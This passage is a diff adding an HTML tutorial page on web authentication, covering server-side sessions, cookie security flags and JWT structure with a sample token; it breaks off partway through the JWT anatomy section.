@@ -1,0 +1,1458 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sessions & JWTs — Deep Dive</title>
+<link href="https://fonts.googleapis.com/css2?family=DM+Serif+Display:ital@0;1&family=DM+Mono:wght@400;500&family=DM+Sans:wght@300;400;500;600&display=swap" rel="stylesheet">
+<style>
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+:root {
+  --bg: #faf7f2;
+  --ink: #1a1410;
+  --ink2: #3d352c;
+  --muted: #8a7d6e;
+  --border: #e0d8cc;
+  --surface: #fff;
+  --surface2: #f5f0e8;
+  --amber: #c8772a;
+  --amber-light: #fef3e2;
+  --teal: #1a6b5e;
+  --teal-light: #e6f4f1;
+  --rose: #b94040;
+  --rose-light: #fdeaea;
+  --blue: #2b5fa3;
+  --blue-light: #e8eef8;
+  --violet: #6b3fa0;
+  --violet-light: #f0eaf8;
+  --green: #2d7a47;
+  --green-light: #e8f5ee;
+}
+
+body {
+  font-family: 'DM Sans', sans-serif;
+  background: var(--bg);
+  color: var(--ink);
+  line-height: 1.7;
+  min-height: 100vh;
+}
+
+/* Paper texture overlay */
+body::before {
+  content: '';
+  position: fixed;
+  inset: 0;
+  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='300' height='300'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.65' numOctaves='3' stitchTiles='stitch'/%3E%3CfeColorMatrix type='saturate' values='0'/%3E%3C/filter%3E%3Crect width='300' height='300' filter='url(%23noise)' opacity='0.03'/%3E%3C/svg%3E");
+  pointer-events: none;
+  z-index: 0;
+}
+
+.page {
+  max-width: 1000px;
+  margin: 0 auto;
+  padding: 0 1.5rem 6rem;
+  position: relative;
+  z-index: 1;
+}
+
+/* ─── HEADER ─── */
+header {
+  padding: 5rem 0 3rem;
+  border-bottom: 2px solid var(--ink);
+  margin-bottom: 3rem;
+  position: relative;
+}
+
+.header-eyebrow {
+  font-family: 'DM Mono', monospace;
+  font-size: 0.65rem;
+  letter-spacing: 0.3em;
+  text-transform: uppercase;
+  color: var(--amber);
+  margin-bottom: 1rem;
+  opacity: 0;
+  animation: rise 0.7s ease forwards 0.1s;
+}
+
+h1 {
+  font-family: 'DM Serif Display', Georgia, serif;
+  font-size: clamp(3rem, 7vw, 5.5rem);
+  line-height: 1;
+  letter-spacing: -0.02em;
+  color: var(--ink);
+  opacity: 0;
+  animation: rise 0.7s ease forwards 0.2s;
+}
+
+h1 em {
+  font-style: italic;
+  color: var(--amber);
+}
+
+.header-sub {
+  margin-top: 1.25rem;
+  font-size: 1.05rem;
+  color: var(--muted);
+  max-width: 540px;
+  font-weight: 300;
+  opacity: 0;
+  animation: rise 0.7s ease forwards 0.35s;
+}
+
+.header-stamp {
+  position: absolute;
+  top: 3rem;
+  right: 0;
+  width: 100px;
+  height: 100px;
+  border: 3px solid var(--amber);
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  text-align: center;
+  font-family: 'DM Mono', monospace;
+  font-size: 0.55rem;
+  letter-spacing: 0.1em;
+  text-transform: uppercase;
+  color: var(--amber);
+  opacity: 0;
+  animation: rise 0.7s ease forwards 0.5s;
+  transform: rotate(-12deg);
+}
+
+/* ─── SECTION ─── */
+.section {
+  margin: 3.5rem 0;
+  opacity: 0;
+  transform: translateY(20px);
+  transition: opacity 0.55s ease, transform 0.55s ease;
+}
+.section.visible { opacity: 1; transform: none; }
+
+.section-num {
+  font-family: 'DM Mono', monospace;
+  font-size: 0.6rem;
+  letter-spacing: 0.25em;
+  text-transform: uppercase;
+  color: var(--muted);
+  margin-bottom: 0.25rem;
+}
+
+h2 {
+  font-family: 'DM Serif Display', Georgia, serif;
+  font-size: 2rem;
+  letter-spacing: -0.01em;
+  margin-bottom: 1.25rem;
+  color: var(--ink);
+  border-bottom: 1px solid var(--border);
+  padding-bottom: 0.5rem;
+}
+
+p { margin-bottom: 0.8rem; color: var(--ink2); }
+p:last-child { margin-bottom: 0; }
+
+/* ─── ANALOGY BOX ─── */
+.analogy {
+  background: var(--amber-light);
+  border: 1px solid #f0d5a0;
+  border-left: 4px solid var(--amber);
+  border-radius: 6px;
+  padding: 1.25rem 1.5rem;
+  margin: 1.25rem 0;
+  font-size: 0.93rem;
+}
+.analogy strong { color: var(--amber); font-family: 'DM Serif Display', serif; font-size: 1rem; }
+
+/* ─── TWO COLUMN ─── */
+.two-col { display: grid; grid-template-columns: 1fr 1fr; gap: 1.25rem; margin: 1.25rem 0; }
+@media (max-width: 640px) { .two-col { grid-template-columns: 1fr; } }
+
+/* ─── CARD ─── */
+.card {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 1.25rem 1.5rem;
+  transition: box-shadow 0.2s, transform 0.2s;
+}
+.card:hover { box-shadow: 0 4px 20px rgba(0,0,0,0.07); transform: translateY(-1px); }
+
+.card-label {
+  font-family: 'DM Mono', monospace;
+  font-size: 0.6rem;
+  letter-spacing: 0.2em;
+  text-transform: uppercase;
+  color: var(--muted);
+  margin-bottom: 0.35rem;
+}
+.card-title {
+  font-family: 'DM Serif Display', serif;
+  font-size: 1.1rem;
+  color: var(--ink);
+  margin-bottom: 0.5rem;
+}
+.card-body { font-size: 0.88rem; color: var(--muted); line-height: 1.65; }
+
+/* border accents */
+.card.amber { border-top: 3px solid var(--amber); }
+.card.teal { border-top: 3px solid var(--teal); }
+.card.rose { border-top: 3px solid var(--rose); }
+.card.blue { border-top: 3px solid var(--blue); }
+.card.violet { border-top: 3px solid var(--violet); }
+.card.green { border-top: 3px solid var(--green); }
+
+/* ─── SESSION vs JWT TOGGLE ─── */
+.toggle-wrapper {
+  display: flex;
+  gap: 0.5rem;
+  margin-bottom: 1.5rem;
+  background: var(--surface2);
+  padding: 0.3rem;
+  border-radius: 8px;
+  width: fit-content;
+  border: 1px solid var(--border);
+}
+.toggle-btn {
+  font-family: 'DM Mono', monospace;
+  font-size: 0.75rem;
+  letter-spacing: 0.08em;
+  text-transform: uppercase;
+  padding: 0.5rem 1.2rem;
+  border-radius: 6px;
+  border: none;
+  background: transparent;
+  cursor: pointer;
+  color: var(--muted);
+  transition: all 0.2s;
+}
+.toggle-btn.active {
+  background: var(--surface);
+  color: var(--ink);
+  box-shadow: 0 1px 4px rgba(0,0,0,0.1);
+}
+
+.compare-panel { display: none; }
+.compare-panel.active { display: block; animation: fadeIn 0.3s ease; }
+
+/* ─── JWT ANATOMY ─── */
+.jwt-display {
+  background: var(--ink);
+  border-radius: 10px;
+  padding: 1.5rem;
+  margin: 1.25rem 0;
+  font-family: 'DM Mono', monospace;
+  font-size: 0.78rem;
+  line-height: 1.5;
+  position: relative;
+  overflow: hidden;
+  word-break: break-all;
+}
+
+.jwt-part {
+  display: inline;
+  cursor: pointer;
+  border-radius: 2px;
+  padding: 0 1px;
+  transition: opacity 0.2s;
+}
+.jwt-part.header-color { color: #f97316; }
+.jwt-part.payload-color { color: #a78bfa; }
+.jwt-part.sig-color { color: #34d399; }
+.jwt-dot { color: #4b5563; }
+
+.jwt-legend {
+  display: flex;
+  gap: 1.5rem;
+  margin-top: 1rem;
+  flex-wrap: wrap;
+}
+.jwt-legend-item {
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+  font-family: 'DM Mono', monospace;
+  font-size: 0.7rem;
+  color: #9ca3af;
+  cursor: pointer;
+  transition: opacity 0.2s;
+}
+.jwt-legend-item:hover { opacity: 0.7; }
+.legend-dot {
+  width: 10px;
+  height: 10px;
+  border-radius: 50%;
+  flex-shrink: 0;
+}
+
+/* JWT decoded */
+.jwt-decoded {
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
+  gap: 1rem;
+  margin: 1rem 0;
+}
+@media (max-width: 640px) { .jwt-decoded { grid-template-columns: 1fr; } }
+
+.decoded-part {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 1rem 1.1rem;
+  cursor: pointer;
+  transition: border-color 0.2s;
+}
+.decoded-part.header-part { border-top: 3px solid #f97316; }
+.decoded-part.payload-part { border-top: 3px solid #a78bfa; }
+.decoded-part.sig-part { border-top: 3px solid #34d399; }
+
+.decoded-title {
+  font-family: 'DM Mono', monospace;
+  font-size: 0.6rem;
+  letter-spacing: 0.15em;
+  text-transform: uppercase;
+  margin-bottom: 0.6rem;
+}
+.decoded-title.hdr { color: #f97316; }
+.decoded-title.pld { color: #a78bfa; }
+.decoded-title.sig { color: #34d399; }
+
+.decoded-json {
+  font-family: 'DM Mono', monospace;
+  font-size: 0.72rem;
+  line-height: 1.9;
+  color: var(--ink2);
+}
+.json-key { color: var(--blue); }
+.json-val { color: var(--teal); }
+.json-str { color: var(--rose); }
+.json-comment { color: var(--muted); font-style: italic; font-size: 0.65rem; display: block; }
+
+/* ─── FLOW DIAGRAM ─── */
+.flow-box {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 2rem;
+  margin: 1.25rem 0;
+}
+
+.flow-row {
+  display: grid;
+  grid-template-columns: 100px 1fr;
+  gap: 1rem;
+  cursor: pointer;
+}
+
+.flow-side {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+}
+
+.flow-node {
+  width: 40px;
+  height: 40px;
+  border-radius: 8px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-family: 'DM Mono', monospace;
+  font-weight: 500;
+  font-size: 0.8rem;
+  position: relative;
+  z-index: 1;
+  flex-shrink: 0;
+  transition: transform 0.2s;
+}
+.flow-row:hover .flow-node { transform: scale(1.08); }
+
+.flow-connector {
+  width: 2px;
+  flex: 1;
+  min-height: 32px;
+  background: var(--border);
+  margin-top: 4px;
+}
+.flow-row:last-child .flow-connector { display: none; }
+
+.flow-content { padding: 0.15rem 0 2rem; }
+.flow-actor { font-family: 'DM Mono', monospace; font-size: 0.6rem; letter-spacing: 0.15em; text-transform: uppercase; color: var(--muted); margin-bottom: 0.2rem; }
+.flow-title { font-family: 'DM Serif Display', serif; font-size: 1rem; color: var(--ink); margin-bottom: 0.3rem; }
+.flow-desc { font-size: 0.87rem; color: var(--muted); }
+.flow-expand { display: none; margin-top: 0.75rem; padding: 0.85rem 1rem; background: var(--surface2); border-radius: 6px; font-size: 0.84rem; color: var(--ink2); border-left: 3px solid var(--amber); }
+.flow-expand.open { display: block; animation: fadeIn 0.3s ease; }
+
+/* node colors */
+.n-browser { background: #fef3e2; color: var(--amber); border: 1.5px solid #f0d5a0; }
+.n-server { background: var(--teal-light); color: var(--teal); border: 1.5px solid #9fcfc9; }
+.n-db { background: var(--blue-light); color: var(--blue); border: 1.5px solid #a3bfe0; }
+
+/* ─── CLAIMS TABLE ─── */
+.claims-table {
+  width: 100%;
+  border-collapse: collapse;
+  font-size: 0.88rem;
+  margin: 1.25rem 0;
+}
+.claims-table th {
+  font-family: 'DM Mono', monospace;
+  font-size: 0.65rem;
+  letter-spacing: 0.12em;
+  text-transform: uppercase;
+  padding: 0.65rem 1rem;
+  text-align: left;
+  border-bottom: 2px solid var(--ink);
+  color: var(--muted);
+  background: var(--surface2);
+}
+.claims-table td {
+  padding: 0.7rem 1rem;
+  border-bottom: 1px solid var(--border);
+  vertical-align: top;
+}
+.claims-table tr:hover td { background: var(--surface2); }
+.claim-name { font-family: 'DM Mono', monospace; color: var(--blue); font-size: 0.82rem; }
+code { font-family: 'DM Mono', monospace; font-size: 0.82em; background: var(--surface2); padding: 0.1em 0.35em; border-radius: 3px; color: var(--rose); border: 1px solid var(--border); }
+
+/* ─── CALLOUTS ─── */
+.callout {
+  display: flex;
+  gap: 1rem;
+  padding: 1rem 1.25rem;
+  border-radius: 6px;
+  margin: 1rem 0;
+  font-size: 0.9rem;
+  align-items: flex-start;
+  border: 1px solid;
+}
+.callout-icon { font-size: 1.1rem; flex-shrink: 0; margin-top: 0.1rem; }
+.callout.warn { background: var(--amber-light); border-color: #f0d5a0; }
+.callout.danger { background: var(--rose-light); border-color: #f0b0b0; }
+.callout.info { background: var(--blue-light); border-color: #a3bfe0; }
+.callout.success { background: var(--green-light); border-color: #9fcfb0; }
+
+/* ─── SECURITY GRID ─── */
+.security-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+  gap: 1rem;
+  margin: 1.25rem 0;
+}
+.sec-card {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 1.1rem 1.25rem;
+  cursor: pointer;
+  transition: box-shadow 0.2s;
+}
+.sec-card:hover { box-shadow: 0 3px 12px rgba(0,0,0,0.08); }
+.sec-sev {
+  display: inline-block;
+  font-family: 'DM Mono', monospace;
+  font-size: 0.55rem;
+  letter-spacing: 0.15em;
+  text-transform: uppercase;
+  padding: 0.2rem 0.5rem;
+  border-radius: 2px;
+  margin-bottom: 0.4rem;
+}
+.sev-crit { background: var(--rose-light); color: var(--rose); }
+.sev-high { background: var(--amber-light); color: var(--amber); }
+.sev-med { background: var(--blue-light); color: var(--blue); }
+.sec-name { font-family: 'DM Serif Display', serif; font-size: 0.98rem; margin-bottom: 0.35rem; }
+.sec-body { font-size: 0.85rem; color: var(--muted); }
+.sec-detail { display: none; margin-top: 0.6rem; font-size: 0.83rem; color: var(--ink2); padding-top: 0.6rem; border-top: 1px solid var(--border); }
+.sec-card:hover .sec-detail, .sec-card.active .sec-detail { display: block; }
+
+/* ─── ALGORITHM TABLE ─── */
+.algo-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+  gap: 0.75rem;
+  margin: 1.25rem 0;
+}
+.algo-card {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 1rem;
+  text-align: center;
+}
+.algo-name { font-family: 'DM Mono', monospace; font-size: 0.9rem; font-weight: 500; margin-bottom: 0.3rem; }
+.algo-type { font-family: 'DM Mono', monospace; font-size: 0.6rem; text-transform: uppercase; letter-spacing: 0.1em; color: var(--muted); margin-bottom: 0.5rem; }
+.algo-rec { font-size: 0.78rem; color: var(--muted); }
+.rec-yes { color: var(--green); font-weight: 600; }
+.rec-no { color: var(--rose); }
+.rec-ok { color: var(--amber); }
+
+/* ─── COMPARISON TABLE ─── */
+.big-table { width: 100%; border-collapse: collapse; font-size: 0.87rem; margin: 1.25rem 0; overflow-x: auto; display: block; }
+.big-table th {
+  font-family: 'DM Mono', monospace; font-size: 0.65rem; letter-spacing: 0.1em;
+  text-transform: uppercase; padding: 0.7rem 1rem; text-align: left;
+  border-bottom: 2px solid var(--ink); background: var(--ink); color: var(--bg);
+}
+.big-table td { padding: 0.7rem 1rem; border-bottom: 1px solid var(--border); vertical-align: top; }
+.big-table tr:hover td { background: var(--surface2); }
+.yes { color: var(--green); font-weight: 600; }
+.no { color: var(--rose); }
+.partial { color: var(--amber); }
+
+/* ─── QUIZ ─── */
+.quiz-wrap {
+  background: var(--ink);
+  border-radius: 10px;
+  padding: 2rem;
+  color: var(--bg);
+}
+.quiz-q { font-family: 'DM Serif Display', serif; font-size: 1.15rem; color: #fff; margin-bottom: 1rem; }
+.quiz-opts { display: flex; flex-direction: column; gap: 0.5rem; margin-bottom: 0.75rem; }
+.quiz-opt {
+  padding: 0.7rem 1rem; border: 1px solid #2d2d2d; border-radius: 6px;
+  cursor: pointer; font-size: 0.88rem; color: #9ca3af;
+  transition: all 0.2s; background: #1a1a1a;
+}
+.quiz-opt:hover { border-color: var(--amber); color: var(--amber); }
+.quiz-opt.correct { border-color: #34d399; color: #34d399; background: rgba(52,211,153,0.08); }
+.quiz-opt.wrong { border-color: #f87171; color: #f87171; background: rgba(248,113,113,0.08); }
+.quiz-fb { font-size: 0.84rem; color: #6b7280; min-height: 1.4em; margin-top: 0.25rem; }
+.quiz-footer { display: flex; align-items: center; gap: 1rem; margin-top: 1rem; }
+.q-btn { font-family: 'DM Mono', monospace; font-size: 0.75rem; letter-spacing: 0.1em; text-transform: uppercase; padding: 0.5rem 1.2rem; border-radius: 5px; cursor: pointer; transition: all 0.2s; border: none; }
+.q-btn-primary { background: var(--amber); color: var(--ink); }
+.q-btn-primary:hover { background: #e08030; }
+.q-counter { font-family: 'DM Mono', monospace; font-size: 0.7rem; color: #4b5563; margin-left: auto; }
+
+/* ─── DIVIDER ─── */
+.divider {
+  border: none;
+  height: 1px;
+  background: var(--border);
+  margin: 3rem 0;
+  position: relative;
+}
+.divider::after {
+  content: '§';
+  position: absolute;
+  left: 50%;
+  top: 50%;
+  transform: translate(-50%, -50%);
+  background: var(--bg);
+  padding: 0 0.75rem;
+  color: var(--border);
+  font-family: 'DM Serif Display', serif;
+  font-size: 1.1rem;
+}
+
+/* ─── TOC ─── */
+.toc {
+  background: var(--surface2);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 1.5rem;
+  margin: 2rem 0;
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 0.35rem 2rem;
+}
+@media(max-width:500px) { .toc { grid-template-columns: 1fr; } }
+.toc-head { grid-column: 1/-1; font-family: 'DM Mono', monospace; font-size: 0.65rem; letter-spacing: 0.2em; text-transform: uppercase; color: var(--muted); margin-bottom: 0.75rem; }
+.toc a { font-size: 0.87rem; color: var(--muted); text-decoration: none; display: flex; align-items: center; gap: 0.4rem; transition: color 0.2s; }
+.toc a:hover { color: var(--amber); }
+.toc a::before { content: '→'; font-family: 'DM Mono', monospace; font-size: 0.7rem; color: var(--border); }
+
+/* ─── ANIMATIONS ─── */
+@keyframes rise {
+  from { opacity: 0; transform: translateY(16px); }
+  to { opacity: 1; transform: none; }
+}
+@keyframes fadeIn {
+  from { opacity: 0; } to { opacity: 1; }
+}
+
+/* tabs */
+.tab-bar { display: flex; gap: 0; border-bottom: 2px solid var(--border); margin-bottom: 1.25rem; }
+.tab {
+  font-family: 'DM Mono', monospace; font-size: 0.7rem; letter-spacing: 0.1em; text-transform: uppercase;
+  padding: 0.6rem 1.2rem; cursor: pointer; border: none; background: none; color: var(--muted);
+  border-bottom: 2px solid transparent; margin-bottom: -2px; transition: all 0.2s;
+}
+.tab.active { color: var(--amber); border-bottom-color: var(--amber); }
+.tab-panel { display: none; } .tab-panel.active { display: block; animation: fadeIn 0.3s ease; }
+
+/* lifecycle diagram */
+.lifecycle {
+  display: flex;
+  align-items: center;
+  gap: 0;
+  margin: 1.25rem 0;
+  overflow-x: auto;
+  padding-bottom: 0.5rem;
+}
+.lc-step {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  min-width: 100px;
+  text-align: center;
+}
+.lc-node {
+  width: 52px;
+  height: 52px;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 1.2rem;
+  border: 2px solid var(--border);
+  background: var(--surface);
+  margin-bottom: 0.5rem;
+  transition: transform 0.2s;
+}
+.lc-step:hover .lc-node { transform: scale(1.1); }
+.lc-label { font-family: 'DM Mono', monospace; font-size: 0.62rem; color: var(--muted); letter-spacing: 0.05em; line-height: 1.4; }
+.lc-arrow {
+  flex: 1;
+  min-width: 30px;
+  height: 2px;
+  background: var(--border);
+  position: relative;
+  margin-bottom: 24px;
+}
+.lc-arrow::after {
+  content: '';
+  position: absolute;
+  right: -1px;
+  top: -4px;
+  width: 0;
+  height: 0;
+  border-left: 7px solid var(--border);
+  border-top: 4px solid transparent;
+  border-bottom: 4px solid transparent;
+}
+.lc-note {
+  font-family: 'DM Mono', monospace;
+  font-size: 0.58rem;
+  color: var(--muted);
+  white-space: nowrap;
+  margin-bottom: 30px;
+  text-align: center;
+  flex: 1;
+  min-width: 30px;
+}
+</style>
+</head>
+<body>
+<div class="page">
+
+  <!-- HEADER -->
+  <header>
+    <div class="header-eyebrow">Auth Engineering Reference</div>
+    <h1>Sessions &amp; <em>JWTs</em></h1>
+    <p class="header-sub">The complete inner workings — from cookie jars to signed tokens, storage wars, attacks, and production wisdom.</p>
+    <div class="header-stamp">Deep<br>Dive<br>Reference<br>v2.0</div>
+  </header>
+
+  <!-- TOC -->
+  <nav class="toc section" id="s0">
+    <div class="toc-head">Contents</div>
+    <a href="#s1">The Core Problem</a>
+    <a href="#s2">Session-Based Auth</a>
+    <a href="#s3">JWT Deep Dive</a>
+    <a href="#s4">JWT Anatomy</a>
+    <a href="#s5">Claims Reference</a>
+    <a href="#s6">Signing Algorithms</a>
+    <a href="#s7">Storage: Where to Keep Tokens</a>
+    <a href="#s8">Sessions vs JWTs</a>
+    <a href="#s9">Refresh Token Pattern</a>
+    <a href="#s10">Security Attacks</a>
+    <a href="#s11">Test Yourself</a>
+  </nav>
+
+  <!-- ─── 01 THE PROBLEM ─── -->
+  <section class="section" id="s1">
+    <div class="section-num">01 — Foundation</div>
+    <h2>The Core Problem: HTTP is Stateless</h2>
+
+    <p>HTTP was designed to be completely stateless. Every request is a blank slate — the server has <strong>zero memory</strong> of who you are between requests. You log in, then make the next request... and the server has no idea you were ever there.</p>
+
+    <div class="analogy">
+      <strong>🎭 The Amnesiac Bartender</strong><br><br>
+      Imagine a bar where the bartender forgets your face every time you step away. You order a drink, show your ID, get served — then turn around to grab some nuts. When you come back 10 seconds later, the bartender demands your ID again. Every single time.<br><br>
+      That's HTTP. Session management is the solution: <strong>giving the bartender a notepad</strong> (server-side sessions) or <strong>giving you a wristband</strong> (tokens/JWTs) that proves you already paid.
+    </div>
+
+    <p>Two fundamentally different approaches emerged to solve this:</p>
+    <div class="two-col">
+      <div class="card amber">
+        <div class="card-label">Approach A</div>
+        <div class="card-title">Server-Side Sessions</div>
+        <div class="card-body">Server remembers you. Client just carries a reference ID (like a ticket stub). Server looks you up every time.</div>
+      </div>
+      <div class="card teal">
+        <div class="card-label">Approach B</div>
+        <div class="card-title">Tokens (JWT)</div>
+        <div class="card-body">Server remembers nothing. Client carries a self-contained, cryptographically signed credential. Server just validates it.</div>
+      </div>
+    </div>
+  </section>
+
+  <hr class="divider">
+
+  <!-- ─── 02 SESSIONS ─── -->
+  <section class="section" id="s2">
+    <div class="section-num">02 — Classic Approach</div>
+    <h2>Session-Based Authentication</h2>
+
+    <p>The traditional web approach. The server does all the heavy lifting.</p>
+
+    <!-- Session flow -->
+    <div class="flow-box">
+      <div style="font-family:'DM Mono',monospace;font-size:0.65rem;letter-spacing:0.15em;text-transform:uppercase;color:var(--muted);margin-bottom:1.5rem;">Session Flow — Step by Step</div>
+
+      <div class="flow-row" onclick="toggleFlow(this)">
+        <div class="flow-side"><div class="flow-node n-browser">🧑</div><div class="flow-connector"></div></div>
+        <div class="flow-content">
+          <div class="flow-actor">User → Server</div>
+          <div class="flow-title">POST /login with credentials</div>
+          <div class="flow-desc">User submits username + password via a form.</div>
+          <div class="flow-expand">The credentials travel over HTTPS (never HTTP — plain text passwords over the wire is catastrophic). The server receives them and begins verification.</div>
+        </div>
+      </div>
+
+      <div class="flow-row" onclick="toggleFlow(this)">
+        <div class="flow-side"><div class="flow-node n-server">⚙️</div><div class="flow-connector"></div></div>
+        <div class="flow-content">
+          <div class="flow-actor">Server</div>
+          <div class="flow-title">Verifies credentials, creates Session</div>
+          <div class="flow-desc">Server checks the password hash, then creates a session record in a store (DB, Redis, memory).</div>
+          <div class="flow-expand">Session record stores: user ID, roles, login time, expiry, and any other relevant state. A cryptographically random session ID is generated (e.g. 128-bit hex). <strong>Never</strong> use sequential IDs — they're trivially guessable.</div>
+        </div>
+      </div>
+
+      <div class="flow-row" onclick="toggleFlow(this)">
+        <div class="flow-side"><div class="flow-node n-server">🍪</div><div class="flow-connector"></div></div>
+        <div class="flow-content">
+          <div class="flow-actor">Server → Browser</div>
+          <div class="flow-title">Set-Cookie: sessionId=abc123</div>
+          <div class="flow-desc">Server responds with a <code>Set-Cookie</code> header. Browser stores the cookie automatically.</div>
+          <div class="flow-expand">Ideal cookie flags: <code>HttpOnly</code> (JS can't read it — XSS protection), <code>Secure</code> (HTTPS only), <code>SameSite=Strict</code> or <code>Lax</code> (CSRF protection), appropriate <code>Max-Age</code>. This is your entire security posture in one response header.</div>
+        </div>
+      </div>
+
+      <div class="flow-row" onclick="toggleFlow(this)">
+        <div class="flow-side"><div class="flow-node n-browser">📨</div><div class="flow-connector"></div></div>
+        <div class="flow-content">
+          <div class="flow-actor">Browser → Server (every subsequent request)</div>
+          <div class="flow-title">Cookie: sessionId=abc123 sent automatically</div>
+          <div class="flow-desc">The browser attaches the cookie to every request to the same domain. No code needed.</div>
+          <div class="flow-expand">This automatic behavior is both the power and the danger of cookies. It means you get auth for free on every request, but it also enables CSRF attacks if you don't use SameSite or CSRF tokens.</div>
+        </div>
+      </div>
+
+      <div class="flow-row" onclick="toggleFlow(this)">
+        <div class="flow-side"><div class="flow-node n-db">🗄️</div><div class="flow-connector"></div></div>
+        <div class="flow-content">
+          <div class="flow-actor">Server — every request</div>
+          <div class="flow-title">Looks up session in store</div>
+          <div class="flow-desc">Server takes the session ID from the cookie, queries the session store, and gets user data back.</div>
+          <div class="flow-expand">This is the key trade-off: <strong>every single authenticated request hits the database or cache</strong>. Redis makes this fast (sub-millisecond), but it's still a dependency. If the session store goes down, all users are logged out instantly.</div>
+        </div>
+      </div>
+
+      <div class="flow-row" onclick="toggleFlow(this)">
+        <div class="flow-side"><div class="flow-node n-server">✅</div><div class="flow-connector"></div></div>
+        <div class="flow-content">
+          <div class="flow-actor">Server → User</div>
+          <div class="flow-title">Serves the response</div>
+          <div class="flow-desc">Session found and valid — request is fulfilled. The user sees their data.</div>
+          <div class="flow-expand">Logout is simple: delete the session record from the store. The session ID cookie becomes worthless immediately — even if someone stole it, it no longer maps to anything. This is immediate invalidation, which JWT cannot do easily.</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="analogy">
+      <strong>🎫 The Coat Check Analogy</strong><br><br>
+      You give the coat check your jacket. They give you a ticket stub (session ID). You keep the stub; they keep the jacket (your data). Every time you want your jacket, you show the stub and they fetch it. If you lose the stub, it's fine — they can cancel it. If the coat check closes (session store outage), <em>everyone</em> loses their jacket at once.
+    </div>
+  </section>
+
+  <hr class="divider">
+
+  <!-- ─── 03 JWT ─── -->
+  <section class="section" id="s3">
+    <div class="section-num">03 — Modern Approach</div>
+    <h2>JSON Web Tokens (JWT)</h2>
+
+    <p>Pronounced <em>"jot"</em>. A JWT is a self-contained credential — a compact, URL-safe token that carries all the information the server needs, signed so it can't be tampered with.</p>
+
+    <p>The defining insight: <strong>the server stores nothing</strong>. Instead of a session ID that points to server-side data, the JWT <em>is</em> the data — and the signature proves it hasn't been modified.</p>
+
+    <div class="analogy">
+      <strong>🏛️ The Notarized Document Analogy</strong><br><br>
+      Imagine a notarized letter: "This is John, he's a senior engineer at Acme Corp, cleared for building access until Dec 31." The notary (IdP/auth server) stamps and signs it. Anyone who sees the letter can verify the stamp is real — no need to call the notary. John carries his own credential.<br><br>
+      If John gets fired, the letter still looks valid until it expires. That's the JWT revocation problem.
+    </div>
+
+    <!-- JWT lifecycle -->
+    <div style="overflow-x:auto;margin:1.5rem 0;">
+      <div class="lifecycle">
+        <div class="lc-step">
+          <div class="lc-node">🔑</div>
+          <div class="lc-label">Login /<br>Auth</div>
+        </div>
+        <div style="display:flex;flex-direction:column;align-items:center;min-width:60px;">
+          <div class="lc-arrow"></div>
+          <div class="lc-note">server signs</div>
+        </div>
+        <div class="lc-step">
+          <div class="lc-node">🪙</div>
+          <div class="lc-label">JWT<br>Issued</div>
+        </div>
+        <div style="display:flex;flex-direction:column;align-items:center;min-width:60px;">
+          <div class="lc-arrow"></div>
+          <div class="lc-note">stored client</div>
+        </div>
+        <div class="lc-step">
+          <div class="lc-node">📤</div>
+          <div class="lc-label">Sent in<br>Header</div>
+        </div>
+        <div style="display:flex;flex-direction:column;align-items:center;min-width:60px;">
+          <div class="lc-arrow"></div>
+          <div class="lc-note">verify sig</div>
+        </div>
+        <div class="lc-step">
+          <div class="lc-node">✅</div>
+          <div class="lc-label">Server<br>Validates</div>
+        </div>
+        <div style="display:flex;flex-direction:column;align-items:center;min-width:60px;">
+          <div class="lc-arrow"></div>
+          <div class="lc-note">time passes</div>
+        </div>
+        <div class="lc-step">
+          <div class="lc-node">⏰</div>
+          <div class="lc-label">Token<br>Expires</div>
+        </div>
+        <div style="display:flex;flex-direction:column;align-items:center;min-width:60px;">
+          <div class="lc-arrow"></div>
+          <div class="lc-note">refresh</div>
+        </div>
+        <div class="lc-step">
+          <div class="lc-node">🔄</div>
+          <div class="lc-label">New JWT<br>Issued</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <hr class="divider">
+
+  <!-- ─── 04 ANATOMY ─── -->
+  <section class="section" id="s4">
+    <div class="section-num">04 — Inner Structure</div>
+    <h2>JWT Anatomy: Three Parts</h2>
+
+    <p>A JWT is three Base64URL-encoded JSON objects, joined by dots. Hover over each segment.</p>
+
+    <div class="jwt-display">
+      <span class="jwt-part header-color" title="Header">eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9</span><span class="jwt-dot">.</span><span class="jwt-part payload-color" title="Payload">eyJzdWIiOiJ1c2VyXzEyMyIsImVtYWlsIjoiYWxpY2VAY29tcGFueS5jb20iLCJyb2xlcyI6WyJhZG1pbiIsImVuZ2luZWVyaW5nIl0sImlhdCI6MTcwNTMyODAwMCwiZXhwIjoxNzA1MzMxNjAwLCJpc3MiOiJodHRwczovL2F1dGgubXlhcHAuY29tIn0</span><span class="jwt-dot">.</span><span class="jwt-part sig-color" title="Signature">SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</span>
+      <div class="jwt-legend">
+        <div class="jwt-legend-item"><div class="legend-dot" style="background:#f97316"></div>Header</div>
